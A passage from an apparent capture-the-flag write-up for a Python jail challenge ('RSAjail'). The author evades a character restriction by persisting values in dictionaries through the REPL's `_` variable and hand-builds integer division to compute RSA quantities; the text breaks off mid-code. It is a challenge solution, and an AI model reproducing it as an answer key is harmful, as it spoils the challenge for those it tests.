&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; _
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can abuse this by setting &lt;code&gt;_&lt;/code&gt; to a dictionary, and indexing &lt;code&gt;_&lt;/code&gt; to retrieve previous values.&lt;/p&gt;
&lt;p&gt;For example, we can calculate &lt;code&gt;(p-1)*(q-1)&lt;/code&gt; like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; p
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; ,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; q
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;130453368488282617461032810074522133815958556838372320878351037317254582579520496442111308634980986173256623006744002301860206808920405156266044823886359095797043398827547968038679184174328667197382367501477538816429160786329587127876859248437805001084458927041274502045315450217629728195086234876359956231456&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;150696117254969335819306125948039770222551358810181509713201480554139338362396967781188614953302019959221233518074437714525269530003480482301144411821795677909740495479721830825842680697306040107729861936962506057445590196810051637125467630512958374263647444393642284997681698662489843408404877087566659920152&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; _
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; _
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;19658816114015959168822661506934810897746960941508301523029898136829954236422356288230696714218497509145448247127171276213685927588540138953910488498609797415885703059377908419410932089341671694572542346075296204447444635775115780432725985759675826220650952905101702667277980946442594098014568732789802673665667225413214570807283049096859582889661398498157981323057236154569835810275263469796988291767495525770407135666368492305748827844500324295980229672430552604836440976090945459132931131284757058681153434167367671157762655890529069079342229735526584363500860733795350106921012399286697018279853439199071790701312&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In the example above, we used dictionary key &lt;code&gt;1&lt;/code&gt; to store &lt;code&gt;p-1&lt;/code&gt; and key &lt;code&gt;2&lt;/code&gt; to store &lt;code&gt;q-1&lt;/code&gt;. Then we calculated &lt;code&gt;(p-1)*(q-1)&lt;/code&gt; through &lt;code&gt;_[1]*_[2]&lt;/code&gt;, storing it in key &lt;code&gt;3&lt;/code&gt;. (Yes, I could&amp;rsquo;ve used &lt;code&gt;()&lt;/code&gt; brackets to do it in one go, but I wanted to illustrate an example of persisting values across expressions)&lt;/p&gt;
&lt;p&gt;If we want certain values to persist, we can simply assign the key to its previous self, such as &lt;code&gt;{1:_[1]}&lt;/code&gt;. Doing this, we can now keep track of values across multiple expressions.&lt;/p&gt;
&lt;p&gt;From now on, I will condense all expressions into a single line, without newlines, for readibily. But keep in mind that every character will be on its own line, thus operators and values 2 chars or longer can&amp;rsquo;t be used.&lt;/p&gt;
&lt;h3 id=&#34;integer-division---calculating-q--n--p&#34;&gt;Integer division - calculating &lt;code&gt;q = N // p&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;Okay, so &lt;code&gt;//&lt;/code&gt; is banned, so we can&amp;rsquo;t divide two integers. Which is tragic, as some parts of our solution from RSAjail-2 requires integer division. Including the simplest one, &lt;code&gt;q = N // p&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;But how hard is it to divide numbers without &lt;code&gt;//&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;We could use &lt;code&gt;/&lt;/code&gt;, which would output a float, but for our purpose, dividing two large integers results in a lot of precision lost, and there is also no way to convert it back into an integer.&lt;/p&gt;
&lt;p&gt;Which leaves us with only one choice - to &lt;strong&gt;implement integer division manually&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;This turned out to be extremely tricky - we need something that doesn&amp;rsquo;t have too many conditions/loops, since those are hard to implement, and also no bitshifts, as &lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt; are too long.&lt;/p&gt;
&lt;p&gt;I asked ChatGPT until it gave me something I was looking for, and modified it to become this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;divide&lt;/span&gt;(dividend, divisor):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    quotient &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    multiples &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Precompute multiples of the divisor to avoid the inner loop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    current_multiple &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; divisor
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    current_quotient &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    times &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; divisor&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;bit_length()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(times):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        multiples&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append((current_multiple, current_quotient))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        current_multiple &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; current_multiple  &lt;span style=&#34;color:#75715e&#34;&gt;# Double it&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        current_quotient &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; current_quotient  &lt;span style=&#34;color:#75715e&#34;&gt;# Double the corresponding quotient&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Now, subtract the largest possible multiples&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(times):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        multiple, multiple_quotient &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; multiples[times &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; i]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; dividend &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; multiple:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            dividend &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; multiple  &lt;span style=&#34;color:#75715e&#34;&gt;# 3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            quotient &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; multiple_quotient  &lt;span style=&#34;color:#75715e&#34;&gt;# 9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; quotient
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&amp;rsquo;s kinda confusing how it divides, but it does work. The main things to note is that the times we iterate depends on the size of the divisor, which in the case of &lt;code&gt;q = N // p&lt;/code&gt;, &lt;code&gt;p&lt;/code&gt; has bitlength 1024 so we will loop that many times. It also doesn&amp;rsquo;t matter if we loop too many times, which is good, so I settled with 1028 times just in case.&lt;/p&gt;
&lt;p&gt;Notice the &lt;code&gt;multiples&lt;/code&gt; list is just $\text{divisor} * 2^i$ (&lt;code&gt;current_multiple&lt;/code&gt;) and powers of 2, $2^i$ (&lt;code&gt;current_quotient&lt;/code&gt;), for $i$ being from 0 to the bitlength of the divisor.&lt;/p&gt;
&lt;p&gt;Since we know the powers of 2, we can pre-compute them, so instead of having a list of tuples, we can just have a list of multiples of the divisor ($\text{divisor} * 2^i$).&lt;/p&gt;
&lt;p&gt;And we do have a way to append elements onto lists, using &lt;code&gt;[a] + [b] = [a, b]&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:[]}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: []}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:_[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:_[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You may be wondering why we can&amp;rsquo;t compute the multiples of the divisor during the second loop, eliminating the need for a list. This is because in the second loop, we loop backwards through the multiples, going from e.g. $\text{divisor} * 2^{1027}$, $\text{divisor} * 2^{1026}$ &amp;hellip; $\text{divisor} * 2^0$. And to go from $\text{divisor} * 2^{1027}$ to $\text{divisor} * 2^{1026}$, we need integer division, dividing by 2 (&lt;code&gt;// 2&lt;/code&gt;) - the thing we are literally trying to implement. So it makes more sense to start from $\text{divisor}$, and keep doubling it, 1028 times.&lt;/p&gt;
&lt;p&gt;Our first step is to generate the list of divisor multiples, $\text{divisor} * 2^i$:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:[],&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;:p}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:_[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;[_[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]],&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;:_[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:_[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;[_[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]],&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;:_[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:_[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;[_[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]],&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;:_[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; (repeated &lt;span style=&#34;color:#ae81ff&#34;&gt;1028&lt;/span&gt; times)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then, we do the second loop.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_multiple&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_quotient&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;:N,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# iteration 0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1027&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dividend&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quotient&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiple&amp;#34;&lt;/span&gt;: _[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multiples&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;1027&lt;/span&gt;],
